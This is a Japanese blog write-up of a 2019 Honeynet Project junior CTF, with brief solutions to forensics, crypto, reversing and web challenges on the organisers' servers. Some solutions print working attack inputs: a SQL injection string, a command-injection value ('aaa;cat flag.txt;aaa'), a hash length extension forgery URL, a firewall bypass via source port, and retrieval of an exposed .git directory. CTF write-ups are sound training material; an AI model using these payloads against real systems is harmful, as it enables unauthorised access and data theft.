---
title: "The Honeynet Project: Innsbruck Workshop CTF Writeup"
date: 2019-06-03T00:00:00+08:00
lastmod: 2019-06-03T07:33:00+08:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: "きゃぷあめ"
---

[https://www.reddit.com/r/netsec/new/](https://www.reddit.com/r/netsec/new/)を見ていたら、たまたまCTFを見つけたのでやってみました。
<br /><br />
Junior CTFなので簡単なものがほとんどですが、Hardの2つとわけがわからないやつ1つが解けませんでした。。
<br /><br />
同じタイミングでFacebook CTFもやってましたけど、こっちの方が楽しかったのでFacebook CTFの方は放置プレイしました。
<br /><br />
参加者が少なかったのもあって、全体の中で14番でした^^
<br />
<img src="https://captureamerica.github.io/writeups/img/honey_rank.png" alt="honey_rank.png">

<br /><br />
# Too Meta (easy, image-forensics)
- - -
## Challenge
> There's a flag hidden in the image. Can you find it?

Attachment:

- meta.jpg

## Solution
ExifTool


<br /><br />
<br /><br />
# DNS Records (easy, network)
- - -
> Any suspicious records on hi.ls?

## Solution
$ dig @8.8.8.8 hi.ls txt


<br /><br />
<br /><br />
# Wanna buy a flag? (easy, network)
- - -
> Analyze the network traffic to get the flag.

Attachment:

- buyaflag.pcap

## Solution
Wireshark -> Follow TCP stream


<br /><br />
<br /><br />
# Find The Flag (easy, binary)
- - -
> There is a flag hidden in this binary. Can you find it?

Attachment:

- findtheflag

## Solution
strings & grep


<br /><br />
<br /><br />
# Anti-Vaxx (easy, web)
- - -
> How do you defeat an anti-vaxxer?

## Solution
view sourceで、"OWASP A1:2107"が見つかります。ググったら、よくあるSQL Injectionなのがわかります。
<pre>' or '1'='1</pre>


<br /><br />
<br /><br />
# Prime Factory (easy, crypto)
- - -
> The following two numbers have three prime factors each. Take the largest prime factor x, and submit it as a flag like so: \__flag__{x}.<br />
786157563836987543027608510735334168859
275030867366686996969667414354528430922804392211206745642631729

## Solution
[http://factordb.com/index.php](http://factordb.com/index.php) で、factorize。


<br /><br />
<br /><br />
# Port Scanning (easy, network)
- - -
> Knock, knock!
<br />
&nbsp;&nbsp;&nbsp;&nbsp;Who's there?
<br />
A hidden service running on ctf.honeynet.org, but we won't tell you where.
<br />
&nbsp;&nbsp;&nbsp;&nbsp;ctf.honeynet.org who?
<br />
Port 9000?10000, stop asking bruh!


## Solution
`nmap -sT ctf.honeynet.org -p 9000-10000`で、ポート9413がオープンなのがわかります。NetCatで繋ぐと、"Knock, knock!"とくるので、"Who's there?"を返すとフラグが取れます。
<pre>
$ nc -v ctf.honeynet.org 9413
Connection to ctf.honeynet.org 9413 port [tcp/*] succeeded!
Knock, knock!
Who's there?
\__flag__{a167a64775aee31037855cdf4386a04d}
</pre>


<br /><br />
<br /><br />
# Systeme, Anwendungen, Produkte. (easy, web)
- - -
> To manage the ever-increasing number of flags for the CTF system, the administrators have decided to use SAP as a management platform.


## Solution
ウェブサイトにアクセスすると、"This website only works on Internet Explorer 6" と出るので、User-Agentを変えればOK。
<pre>
wget -O - "http://ctf.honeynet.org:8204/" --user-agent="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
</pre>


<br /><br />
<br /><br />
# Sharks (easy, network)
- - -
> Analyze the network traffic to get the flag.

Attachment:

- shark.pcap

## Solution
WireSharkで、httpのobjectをexport。


<br /><br />
<br /><br />
# Texture (easy, image-forensics)
- - -
> There's a flag hidden in the image. Can you find it?

Attachment:

- texture.png

## Solution
「青い空を見上げればいつもそこに白い猫」のステガノグラフィー解析より、灰色ピクセルを強調。
<br />
フラグの文字列は右下に出るので、フルスクリーンにしておかないと見逃すかも。


<br /><br />
<br /><br />
# There is no such thing as a free flag (easy, network)
- - -
> You have asked the organizers to give you a flag for free. "Sure", they said, "just go to http://ctf.honeynet.org:8101/flag.txt and get it!"
<br /><br />
Unfortunately, it looks like someone put firewall rules in place that will prevent you from simply opening the URL in your favorite web browser... can you find a way around?
<br /><br />
iptables_rules.txt
<br /><br />
If you do this from your home network, Network Address Translation will get into your way.


Attachment:

- iptables_rules.txt

<pre>
Chain firewall (1 references)
target     prot opt source               destination
REJECT     udp  --  0.0.0.0/0            0.0.0.0/0
ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0
ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0            MAC 11:22:33:AA:BB:CC
ACCEPT     all  --  192.168.1.42         0.0.0.0/0
ACCEPT     all  --  0.0.0.0/0            192.168.1.42
LOG        all  --  0.0.0.0/0            0.0.0.0/0            limit: avg 3/min burst 5 LOG level warning prefix "[UFW LIMIT BLOCK] "
ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:8000
REJECT     tcp  --  0.0.0.0/0            0.0.0.0/0            tcp spts:1024:65535 reject-with tcp-reset
ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0
</pre>


## Solution
上から順番に見ていくと、当たってしまうルールは以下なのがわかります。
<pre>
REJECT     tcp  --  0.0.0.0/0            0.0.0.0/0            tcp spts:1024:65535 reject-with tcp-reset
</pre>

問題の最後の一文（"If you do this ~"）は、ホームネットワークでNAPTしてる場合は気をつけてね、の意味ですね。
<br /><br />
送信元ポートをルールの範囲外にしてやって、GETを送るとフラグが返ってきます。（HTTPヘッダの終わりを示すため、エンターは2回押します。）
<pre>
$ nc ctf.honeynet.org 8101 -p 1023
GET /flag.txt HTTP/1.1

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 42
Date: Sat, 01 Jun 2019 03:22:37 GMT
Server: Python/3.7 aiohttp/3.5.4

\__flag__{155ece9cf99a4de280a166f8100f947b}
</pre>


<br /><br />
<br /><br />
# Weird Website (easy, network)
- - -
> Analyze the network traffic to get the flag.

Attachment:

- weirdwebsite.pcap

## Solution
[http://codertab.com/JsUnFuck](http://codertab.com/JsUnFuck)


<br /><br />
<br /><br />
# SuperBank (easy, network, multi-stage)
- - -
> @maximilianhils decided that honeypots aren't challenging enough, so he went out and started a new venture: a blockchain-powered console-based banking app. The first prototype is ready and he happily gives you beta access to test things out. Such excite!
<br /><br />
To start things off, download the superbank client and log into your account with the credentials below. Take your own initial balance x, and submit it as a flag like so: \__flag__{x}.


Attachment:

- superbank.exe
- superbank-osx
- superbank-linux

## Solution
問題の中で、API Endpoint, Username, PINが与えられます。添付されているプログラムを実行すると、それらを入力するようになっているので入力すると、以下に見えるように最初は42トークンを持っているようなので、
<pre>
\================================================================
💰 Welcome to SuperBank, the first blockchain-enabled super bank!
\================================================================
Currently registered accounts:
 - @maximilianhils (5226 tokens)
 - @projecthoneynet (4732 tokens)
 - メールアドレス (42 tokens, that's you!)
</pre>

`__flag__{42}`が答え。


<br /><br />
<br /><br />
# SuperBankNotes (?)
- - -
> The SuperBank app seems to work great, but is it secure? You decide to investigate what @maximilianhils's app is sending on the network. Maybe there is more data on the blockchain than you initially thought?


## (Not solved)
カテゴリも付いていない。ちょっと降参。



<br /><br />
<br /><br />
# (H)ashing-as-a-Service (medium, web)
- - -
> Developers must make sure to not store passwords as plaintext, but scramble them with a password hashing algorithm first. Unfortunately, they often use insecure hashing algorithms such as MD5 to do this. To tackle this problem, we developed Hashing-as-a-Service (HaaS), a modern approach to perfect password security. Using the HaaS API, you can securely hash any password you want!

## Solution
コマンドインジェクション。セミコロンで区切ると、2つ目がコマンドとして実行される。
<br /><br />
入力：`aaa;cat flag.txt;aaa`
<br /><br />
結果：
<pre>
aaa
\__flag__{7de16dbb910d2f0a6736944cd9a531ca}
ash: aaa: not found
SHA-256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
</pre>



<br /><br />
<br /><br />
# Terrific Encryption (medium, cryptography)
- - -
> In a major breakthrough, undergrads at Stanford have unveiled TEA (Terrific Encryption Algorithm) the first quantum-resistant encryption algorithm that can be used on the blockchain. Having learned about the security benefits of TEA, we have immediately encrypted all our flags and are sure that they won't be cracked anytime soon.

Attachment:

- tea.py
- flag (encrypted)

```python :tea.py
import random
import sys
import time


def encrypt(msg: bytes) -> bytes:
    cur_time = str(time.time()).encode()
    random.seed(cur_time)

    key = [random.randrange(256) for _ in msg]
    c = [m ^ k for (m, k) in zip(msg + cur_time, key + [0x42] * len(cur_time))]

    return bytes(c)


if __name__ == "__main__":
    msg = input('Your message: ').encode()
    enc = encrypt(msg)
    with open(sys.argv[1], "wb") as f:
        f.write(enc)
```


## Solution
コードを読み解くと、入力したmsgの部分と、cur_timeはそれぞれ計算されて連結されてるだけなのがわかります。
<br /><br />
具体的に言うと、添付されているflag (encrypted)は、42バイトのフラグ文字列をencryptしたものと、日時の18バイトをencryptしたものの連結です。
<br /><br />
randで乱数を使ってますが、random.seedに固定値を入れると、毎回同じ乱数が取れるはずです。ということで、まずは末尾にある18バイトをdecryptしてcur_timeを求め、それを使ってflagをデコードする、という手順になります。

```c :tea.c
#include <stdio.h>
#include <string.h>

#define buffsize 100
#define flagsize 42

char flag[buffsize];

int find_curtime()
{
	FILE *fp;
	char curtime[buffsize];
	int i;
	
	if ( ( fp = fopen( "flag", "rb" ) ) == NULL ) {
		return -1;
	}
	fread( flag, 1, flagsize, fp );
	fread( curtime, 1, strlen("1559365126.8803241"), fp );

	for( i = 0 ; i < strlen("1559365126.8803241") ; i++ ) {
		printf( "%c", (char)( curtime[i] ^ 0x42 ) );
	}
	puts("");
	fclose( fp );
	return 0;
}

int main(int argc, char **argv)
{
	find_curtime();
}
```


<br /><br />
これで、cur_time（b'1559186793.7909977'）が取得できたので、それを使って乱数を42バイト作ります。ここだけpythonを使いました。

```python :get_randkey.py
import random

flagsize = 42
cur_time = b'1559186793.7909977'
random.seed(cur_time)
key = [random.randrange(256) for _ in range(flagsize)]
for i in key:
    print("{}, ".format(i), end="")
print("\n")
```
<br /><br />
真ん中あたりから下の部分が追加したところです。
```c :tea.c
#include <stdio.h>
#include <string.h>

#define buffsize 100
#define flagsize 42

char flag[buffsize];

int find_curtime()
{
	FILE *fp;
	char curtime[buffsize];
	int i;
	
	if ( ( fp = fopen( "flag", "rb" ) ) == NULL ) {
		return -1;
	}
	fread( flag, 1, flagsize, fp );
	fread( curtime, 1, strlen("1559365126.8803241"), fp );

	for( i = 0 ; i < strlen("1559365126.8803241") ; i++ ) {
		printf( "%c", (char)( curtime[i] ^ 0x42 ) );
	}
	puts("");
	fclose( fp );
	return 0;
}

int rand_tbl[] = {171, 230, 233, 140, 184, 152, 108, 60, 40, 131, 7, 125, 126, 157, 200, 6, 143, 13, 6, 157, 108, 86, 234, 31, 164, 6, 86, 245, 196, 180, 73, 21, 223, 250, 111, 97, 210, 229, 169, 77, 53, 1};

void find_flag()
{
	int i;
	
	for ( i = 0 ; i < flagsize ; i++ ) {
		printf( "%c", flag[i] ^ rand_tbl[i] );
	}
	puts("");
}

int main(int argc, char **argv)
{
	find_curtime();
	find_flag();
}
```



<br /><br />
<br /><br />
# You know the rules, and so do I... ?? (medium, image-forensics)
- - -
> There's a flag hidden in the image. Can you find it?

Attachment:

- qrcode.png


## Solution
「青い空を見上げればいつもそこに白い猫」のステガノグラフィー解析、ビット抽出へ行くと、フラグっぽいのが見えます。
<br />
<img src="https://captureamerica.github.io/writeups/img/bit_extract.png" alt="bit_extract.png">
<br /><br />
ただし、ところどころFFで埋まっていて文字が不明な箇所があります。保存ボタンでバイナリを保存し、エディタでチェックしていきます。
<br /><br />
不明な文字は、他の箇所を探していると見つかります。
<br />
<img src="https://captureamerica.github.io/writeups/img/bin_check.png" alt="bin_check.png">



<br /><br />
<br /><br />
# CoinFlip (medium, binary)
- - -
> Can you find a way to win the game?

Attachment:

- coinflip.exe


## Solution
coinflipに100回勝つとフラグが取れる、ってやつでした。いろんな解法があると思います。自分はx32dbg.exeで解きました。<br />
<br />
rand()を使っている00401633のところをnopで埋めて（バイナリ -> nopで埋める）、先にブレークポイントをセットしておいてから、エンターを押し続ける。<br /><br />
ステップで進めていたら、そのうちフラグが見つかります。



<br /><br />
<br /><br />
# Git Exposed (medium, web)
- - -
> Rumor has it that a flag has been hidden on this web server...

## Solution
サイトにアクセスし、view page sourceした後、/files/ディレクトリを見ると、todo.txtというファイルが見つかります。
<pre>
1. build website
2. git add --all
3. git commit -m "done"
4. git push -f
5. rsync -a . /etc/nginx/html/
6. make local copy of everything with \`wget -r`
7. save world
</pre>

rsyncで、.gitフォルダを含めて丸ごとアップロードしちゃった、みたいなやつですかね。
<br /><br />
6行目にヒントがあって、`wget -r http://ctf.honeynet.org:8200/.git/`をしてローカルに持ってきたあとに、gitコマンドでヒストリーをチェックするとフラグが見つかります。
<pre>
\# git log -p --all --full-history
commit 0918300e45171c89bbdfffa71120df01b77b1c46 (HEAD -> master)
Author: Maximilian Hils \<git@maximilianhils.com>
Date:   Thu Mar 14 21:03:52 2019 +0100
\
    oops! delete private files
\
diff --git a/files/flag.txt b/files/flag.txt
deleted file mode 100644
index c047bcb..0000000
--- a/files/flag.txt
+++ /dev/null
@@ -1 +0,0 @@
-\__flag__{c97c255bd3bad6d77e0b6694abea908c}
\ No newline at end of file
</pre>


<br /><br />
<br /><br />
# Hidden in Plain Sight (medium, misc)
- - -
> （説明なし）


## Solution
これは説明がなにもないんですが、タイトルより、なにか文字があるけど見えないよ、みたいなことだとわかります。
<br /><br />
Inspect Elementすると、\<small>に囲まれた文字列があって、クリップボード経由でコピペしてもエディタ上では?????になってしまいます。
<br /><br />
Burp Suite経由でアクセスしたら、以下が取れました。
<pre>
\u2007\u202f\u2007\u202f\u202f\u202f\u202f\u202f \u2007\u202f\u2007\u202f\u202f\u202f\u202f\u202f \u2007\u202f\u202f\u2007\u2007\u202f\u202f\u2007 \u2007\u202f\u202f\u2007\u202f\u202f\u2007\u2007 \u2007\u202f\u202f\u2007\u2007\u2007\u2007\u202f \u2007\u202f\u202f\u2007\u2007\u202f\u202f\u202f \u2007\u202f\u2007\u202f\u202f\u202f\u202f\u202f \u2007\u202f\u2007\u202f\u202f\u202f\u202f\u202f \u2007\u202f\u202f\u202f\u202f\u2007\u202f\u202f \u2007\u2007\u202f\u202f\u2007\u202f\u2007\u202f \u2007\u2007\u202f\u202f\u2007\u202f\u202f\u2007 \u2007\u202f\u202f\u2007\u2007\u202f\u2007\u202f \u2007\u2007\u202f\u202f\u2007\u202f\u2007\u202f \u2007\u2007\u202f\u202f\u2007\u2007\u2007\u2007 \u2007\u202f\u202f\u2007\u2007\u202f\u202f\u2007 \u2007\u2007\u202f\u202f\u2007\u2007\u2007\u202f \u2007\u2007\u202f\u202f\u202f\u2007\u2007\u2007 \u2007\u202f\u202f\u2007\u2007\u2007\u202f\u2007 \u2007\u2007\u202f\u202f\u2007\u202f\u202f\u2007 \u2007\u2007\u202f\u202f\u2007\u202f\u2007\u2007 \u2007\u2007\u202f\u202f\u2007\u202f\u202f\u202f \u2007\u202f\u202f\u2007\u2007\u202f\u2007\u2007 \u2007\u2007\u202f\u202f\u202f\u2007\u2007\u2007 \u2007\u2007\u202f\u202f\u2007\u2007\u2007\u2007 \u2007\u202f\u202f\u2007\u2007\u202f\u2007\u2007 \u2007\u2007\u202f\u202f\u2007\u2007\u2007\u2007 \u2007\u2007\u202f\u202f\u2007\u2007\u2007\u202f \u2007\u2007\u202f\u202f\u202f\u2007\u2007\u2007 \u2007\u202f\u202f\u2007\u2007\u2007\u202f\u202f \u2007\u202f\u202f\u2007\u2007\u202f\u202f\u2007 \u2007\u2007\u202f\u202f\u2007\u2007\u202f\u2007 \u2007\u2007\u202f\u202f\u2007\u202f\u2007\u2007 \u2007\u2007\u202f\u202f\u2007\u2007\u202f\u202f \u2007\u202f\u202f\u2007\u2007\u202f\u2007\u2007 \u2007\u202f\u202f\u2007\u2007\u2007\u202f\u202f \u2007\u202f\u202f\u2007\u2007\u2007\u2007\u202f \u2007\u2007\u202f\u202f\u2007\u2007\u202f\u202f \u2007\u202f\u202f\u2007\u2007\u202f\u2007\u2007 \u2007\u2007\u202f\u202f\u2007\u2007\u202f\u202f \u2007\u2007\u202f\u202f\u2007\u2007\u202f\u2007 \u2007\u2007\u202f\u202f\u202f\u2007\u2007\u2007 \u2007\u202f\u202f\u202f\u202f\u202f\u2007\u202f
</pre>

<br />
出てくるものは以下の2パターンです。
<br />
\u2007: FIGURE SPACE
<br />
\u202f: NARROW NO-BREAK SPACE

それぞれ以下のように置換してみると、
<br />
\u2007 ==> 0
<br />
\u202f ==> 1

<br />
こうなります。文字列を2進数で表記したもののようですね。
<pre>
01011111 01011111 01100110 01101100 01100001 01100111 01011111 01011111 01111011 00110101 00110110 01100101 00110101 00110000 01100110 00110001 00111000 01100010 00110110 00110100 00110111 01100100 00111000 00110000 01100100 00110000 00110001 00111000 01100011 01100110 00110010 00110100 00110011 01100100 01100011 01100001 00110011 01100100 00110011 00110010 00111000 01111101
</pre>

以下のサイトでデコードしました。
<br />
[https://dencode.com/ja/string/bin](https://dencode.com/ja/string/bin)



<br /><br />
<br /><br />
# Directory Listing (hard, cryptography)
- - -
> To serve all players with new challenges in case the CTF system goes down, we are providing an alternative file server.

Attachment:

- app.py
- lecture-slides.pdf
- investment-advice.png
- cute_kitten.jpg

```python :app.py
"""
DirList: Safely expose a directory on your server!
"""
import hashlib
import html
import os
import re
from pathlib import Path
from urllib.parse import unquote_to_bytes

from aiohttp import web

file_directory: Path = Path(__file__).parent


def sha1(data: bytes) -> str:
    sig = hashlib.sha1()
    sig.update(data)
    return sig.hexdigest()


async def index(request: web.Request):
    """Display directory overview."""
    html = """
        <!doctype html>
        <html lang="en">
        <head><title>Directory Listing</title></head>
        <body>
        <h1>Directory Listing</h1>
        <ul>
    """
    for file in file_directory.iterdir():
        if file.name == "flag.txt" or file.name.startswith("_"):
            continue  # don't allow flag access
        url = f"/download?file={file.name}"
        url += "&sig=" + sha1(request.app["SECRET"] + url.encode())
        html += f"""<li><a href="{url}">{file.name}</a></li>"""

    html += "</ul></body></html>"
    return web.Response(
        text=html,
        content_type="text/html"
    )


async def download(request):
    """Download an individual file."""

    # Extract signature
    if "&sig=" not in request.path_qs:
        return web.HTTPBadRequest(text="No signature given.")
    url, actual_sig = unquote_to_bytes(request.path_qs).split(b"&sig=", maxsplit=1)

    # Get filename from URL
    filename = re.search(r"file=(\w[\w.-]+)&", request.query_string)
    if filename:
        filename = filename.group(1)
    else:
        return web.HTTPBadRequest(text="No valid filename provided.")

    # Calculate correct signature and compare.
    expected_sig = sha1(request.app["SECRET"] + url).encode()
    if expected_sig == actual_sig:
        return web.FileResponse(file_directory / filename)
    else:
        return web.HTTPUnauthorized(text=f"Invalid signature for {html.escape(filename)}.")


if __name__ == "__main__":
    app = web.Application()
    # app["SECRET"] = b"test" * 4
    app["SECRET"] = os.urandom(16)
    app.router.add_get('/', index)
    app.router.add_get('/download', download)
    web.run_app(app)
```

## Solution
ご親切に、lecture-slides.pdfというのがついていて、hash length extension attacksをしてください、というもの。
<br /><br />

サーバのView page sourceより、ネコちゃん画像（とsecret）を元に計算されたHash値を使うことにします。
<pre>
"/download?file=cute_kitten.jpg&sig=70e329b3366e0462ebb45572c178e09ebe5d4f56">cute_kitten.jpg
</pre>

<br />
Macにて、hashpumpをかけます。
<pre>
$ hashpump -s 70e329b3366e0462ebb45572c178e09ebe5d4f56 -d "/download?file=cute_kitten.jpg" -a "&file=flag.txt" -k 16
412b86f5852ba2363928dd5d2363c6b554e99bb3
/download?file=cute_kitten.jpg\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01p&file=flag.txt
</pre>

<br />
これで試すと、Invalid signature for flag.txt となっちゃうんですが、flag.txtをファイル名として扱ってもらえているのはいいサインです。

<br />
signatureを通すには、\xを%に置き換えます。

<pre>
http://ctf.honeynet.org:8202/download?file=cute_kitten.jpg%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01p&file=flag.txt&sig=412b86f5852ba2363928dd5d2363c6b554e99bb3
__flag__{97397db12c32f93ac9c9bf6dc871fd1f}
</pre>


<br /><br />
<br /><br />
# PasswordDB (hard, network)
- - -
> Because data theft has become such a rampant problem, We have created PasswordDB, a new and secure way of storing secrets. PasswordDB's unique technology makes it possible that the password is never stored in a single location, making it the bane of attackers' respective existences. Instead, the password is sliced into smaller parts that are stored on different machines around the world for added security.
<br /><br />
To prove that our system is secure, we have stored a CTF flag in our PasswordDB instance. No way you can get it.
<br /><br />
It is infeasible to brute-force all 10¹² combinations.

Attachment:

- passworddb.py
- PasswordDB API Endpoint (個人のメアドが入っているので省略)
- Example Invocation (個人のメアドが入っているので省略)


## (Not solved)
降参


<br /><br />
<br /><br />
# CookieCopter (hard, cryptography, web)
- - -
> CookieCopter is a new service delivering locally-sourced organic cookies hot off of vintage cookie ovens straight to your location using quad-rotor GPS-enabled helicopters. The service is modeled after TacoCopter, an innovative and highly successful early contender in the airborne food delivery industry. CookieCopter is currently being tested in private beta in select locations.
<br /><br />
Your goal is to order one of the special premium cookies, which comes with a flag as a side.

## (Not solved)
降参



<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />